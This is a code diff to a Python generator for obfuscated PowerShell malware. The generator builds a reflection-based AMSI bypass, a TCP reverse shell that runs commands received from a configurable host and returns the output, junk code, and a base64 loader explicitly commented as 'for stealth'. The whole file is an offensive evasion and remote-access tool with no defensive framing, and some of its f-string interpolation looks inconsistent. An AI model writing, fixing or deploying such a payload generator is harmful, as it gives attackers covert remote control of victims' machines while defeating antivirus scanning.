@@ -9,6 +9,7 @@ def rand_name(length=None):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 def split_string(s):
+    # Obfuscates by turning "System.Text.ASCIIEncoding" into 'S'+'y'+'s'...
     return '+'.join([f"'{c}'" for c in s])
 
 def junk_code():
@@ -22,6 +23,7 @@ def junk_code():
     return random.choice(j) + "\n"
 
 def amsi_bypass_reflection(var):
+    # Classic reflection AMSI bypass (obfuscated strings)
     return (
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
         f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
@@ -31,33 +33,30 @@ def amsi_bypass_reflection(var):
     )
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
-    # Assign *all* needed variables here
     var = {k: rand_name() for k in [
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte"
     ]}
     amsi_bypass = amsi_bypass_reflection(var)
 
-    # Fully explicit core shell: EVERY variable comes from var
+    # --- The Fully Fixed, Reliable Core Shell ---
     core_shell = (
         junk_code() +
         f"${var['tcpclient']} = New-Object -TypeName {split_string('System.Net.Sockets.TCPClient')} -ArgumentList '{host}',{port}\n"
-        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n" +
-        f"${var['bytes']} = 0..65535|%{{0}}\n" +
-        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n" +
-        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n" +
-        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n" +
-        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n" +
-        f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n" +
-        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n" +
-        f"    ${{{var['stream']}}}.Flush()\n" +
+        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
+        f"${var['bytes']} = 0..65535|%{{0}}\n"
+        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
+        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
+        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
+        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n"
+        f"    ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
+        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
+        f"    ${{{var['stream']}}}.Flush()\n"
         "}\n" +
         junk_code()
     )
 
-
-
-    # Loader: base64 always, never obfuscate the loader variable!
+    # --- Loader: Uses base64 for stealth, minimal obfuscation here ---
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
     loader_var = rand_name()
